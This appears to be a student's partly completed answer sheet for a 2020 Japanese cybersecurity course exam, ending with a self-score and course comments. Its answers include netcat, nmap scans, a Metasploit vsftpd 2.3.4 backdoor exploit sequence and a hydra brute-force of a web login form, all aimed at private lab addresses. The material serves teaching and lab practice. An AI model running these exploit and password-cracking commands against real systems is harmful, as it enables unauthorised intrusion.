# CyberSecurity I Exam 2020 回答用紙

## 問1 [netcat]

### サーバー側コマンド

```sh
# nc -lvp 5200

```
### クライアント側コマンド

```sh
# nc 192.168.33.10 5200

```

## 問2 [Password Crack]

```md
<!--  ここに回答を記述 -->

```

## 問3 [Port Scanner]

### 1. ping scan

```sh
# nmap -sP 192.168.33.0/24

```

### 2. version scan

```sh
# nmap 192.168.33.1/24

```

## 問4 [Metasploit Framework]

```sh
# msfconsole
# search vsftp
# use vsftpd_234_backdoor
# show options
# set RHOSTS 192.168.33.5
# show optionsで変わったか確認
# exploit

```

## 問5 [Online Password Cracker]


### 1. コマンド

```sh
# hydra -L user.list -P passwd.list -s 8180 192.168.33.5 http-form-post "/admin/j_security_check:j_username=^USER^&j_password=^PASS^:Invalid username or password"
```

### 2. 解析結果

```sh
# ここに回答を記述

```

## 問6 [Packet Sniffer]

```sh
# ここに回答を記述

```

## 問7 [不正アクセス]

### 1. rootアクセスの件数

```md
<!--  ここに回答を記述 -->

```

### 2. 不正アクセスユーザーのTOP3

```md
<!--  ここに回答を記述 -->

```
### 3. IPアドレスのアクセス件数と発信国

```md
<!--  ここに回答を記述 -->

```

## 問8 [自己評価]

```md
30点

```

## 問9 [講義の感想]

```md
仮想環境構築、ncを使ったチャット、ポートスキャン、Hydra、wiresharkなど
正直難しいし覚えるのが多くて大変だった。１日でも休むと授業について生きなくなることがわかった。休まないようにしたい

```
